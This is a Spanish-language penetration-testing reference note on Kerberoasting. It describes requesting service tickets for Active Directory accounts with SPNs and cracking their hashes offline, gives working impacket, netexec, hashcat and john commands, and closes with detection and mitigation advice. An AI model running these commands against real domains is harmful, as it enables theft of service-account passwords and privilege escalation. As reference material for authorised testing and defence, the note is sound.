---
title: Kerberoasting
resumen: Pedir TGS de cuentas con SPN y crackear el hash offline para obtener su contraseña.
tags: impacket, netexec, hashcat-john, rubeus
---

## Definición

Ataque que aprovecha el protocolo Kerberos para solicitar tickets de servicio (TGS) asociados a cuentas con un Service Principal Name (SPN), con el objetivo de obtener el hash de la contraseña de esas cuentas de servicio y crackearlo offline.

## Cuándo se usa

Cuando ya tienes un usuario válido del dominio, aunque sea con pocos privilegios, y quieres intentar escalar comprometiendo cuentas de servicio que suelen tener contraseñas débiles o antiguas.

## Requisitos previos

- Credenciales válidas de un usuario del dominio
- Conectividad con el controlador de dominio (puerto 88)
- Cuentas de servicio con SPN registrado en el dominio

## Desarrollo del ataque

1. Enumerar las cuentas del dominio que tienen un SPN asociado
2. Solicitar un ticket TGS para cada una de esas cuentas
3. Extraer el hash contenido en el ticket TGS
4. Crackear ese hash offline para obtener la contraseña en texto claro

```bash
# Solicitar TGS de todas las cuentas con SPN
impacket-GetUserSPNs domain.local/USER:PASSWORD -dc-ip DC_IP -request -outputfile kerberoast_hashes.txt

# Alternativa con netexec, en el mismo paso que la enumeración
nxc ldap DC_IP -u "USER" -p 'PASS' --kerberoasting kerberoast_hashes.txt

# Crackeo offline
hashcat -m 13100 -a 0 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt kerberoast_hashes.txt
```

## Herramientas relacionadas

- Ver [[impacket]] (GetUserSPNs)
- Ver [[netexec]]
- Ver [[rubeus]]
- Ver [[hashcat-john]]

## Detección y mitigación

Contraseñas largas y aleatorias en cuentas de servicio, uso de cuentas gestionadas de servicio (gMSA), y monitorización de solicitudes masivas de tickets TGS (evento 4769 con tipo de cifrado RC4 sospechoso) contra múltiples SPNs desde un mismo origen.
